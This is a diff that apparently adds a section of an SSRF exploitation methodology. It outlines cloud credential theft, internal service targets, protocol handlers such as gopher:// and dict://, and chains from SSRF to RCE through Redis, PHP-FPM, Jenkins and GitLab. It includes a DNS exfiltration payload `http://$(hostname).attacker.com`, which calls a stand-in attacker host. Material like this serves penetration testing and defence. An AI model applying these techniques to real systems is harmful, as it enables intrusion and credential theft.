@@ -1,0 +1,25 @@
+**Phase 5: Advanced Exploitation**
+- **Cloud Credential Theft**:
+  - AWS: Extract IAM role credentials, assume roles
+  - GCP: Get service account tokens
+  - Azure: Get managed identity tokens
+- **Internal Application Access**:
+  - Admin panels, monitoring (Grafana, Prometheus, Kibana)
+  - CI/CD systems (Jenkins, GitLab, GitHub Enterprise)
+  - Databases (Redis, MongoDB, Elasticsearch)
+  - Message queues (RabbitMQ, Kafka)
+- **Protocol Handlers for RCE**:
+  - `php://filter` for source code disclosure
+  - `gopher://` for arbitrary TCP payloads
+  - `dict://` for Redis/Memcached command injection
+- **Blind SSRF Exploitation**:
+  - Time-based: `http://127.0.0.1:80` (timeout vs connection refused)
+  - DNS exfiltration: `http://$(hostname).attacker.com`
+  - Error-based: Different error messages for open/closed ports
+
+**Phase 6: SSRF to RCE Chains**
+- **Redis**: Write SSH keys, cron jobs, webshells via `CONFIG SET dir`
+- **FastCGI/PHP-FPM**: Set `PHP_VALUE` with `auto_prepend_file=php://input`
+- **Elasticsearch**: Groovy/scripting RCE (older versions)
+- **Jenkins**: Script console via internal API
+- **GitLab/GitHub**: Webhook RCE, CI/CD pipeline injection
